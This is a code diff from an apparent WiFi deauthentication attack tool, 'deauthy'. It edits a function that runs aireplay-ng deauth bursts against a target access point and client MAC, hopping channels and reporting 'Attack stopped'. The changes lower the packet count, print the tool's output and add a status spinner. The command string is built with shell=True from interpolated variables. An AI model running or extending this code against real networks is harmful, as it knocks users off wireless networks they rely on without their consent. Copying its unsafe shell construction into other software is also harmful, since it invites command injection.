@@ -150,15 +150,14 @@ class Functs:
             if get_var("mon_method") == "airmon": check_call(["airmon-ng", "start", f"{get_var('interface')}", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
             elif get_var("mon_method") == "iw": check_call(["iwconfig", get_var('interface'), "channel", channel_number])
     class BSSID_METHOD:
-        def deauth(_bssid: BSSID):
-            """"""
+        def deauth(_bssid: BSSID, spinner):
             from deauthy.functs import get_var
 
             def ado_bssid_method(bssid_: str, channel: int):
                 Functs.ChannelSys.hopper(channel)
                 try:
-                    out = check_output(f"""aireplay-ng -0 5 -a {bssid_} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
-                    #print(f"""==============OUTPUT============\n{out.decode()}\n================================""")
+                    out = check_output(f"""aireplay-ng -0 2 -a {bssid_} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
+                    print(out.decode())
                     if f", but the AP uses channel" in out.decode():
                         print(f"""=========Trying to get channel============\n{out.decode()[out.decode().find(f"AP uses channel")::]}\n===========================================""")
                 except KeyboardInterrupt:
@@ -170,7 +169,7 @@ class Functs:
             for bssi, chan in _bssid.bssids.items():
                 status = ado_bssid_method(bssi, chan)
                 if status == "stop":
-                    Terminal.inform(f"{Terminal.Light_green+Terminal.Bold+Terminal.Underline}Attack stopped.")
+                    spinner.succeed(f"{Terminal.Light_green+Terminal.Bold+Terminal.Underline}Attack stopped.")
                     return "stop"
 
             if Functs.BSSID_METHOD.deauth(_bssid=_bssid) == "stop":
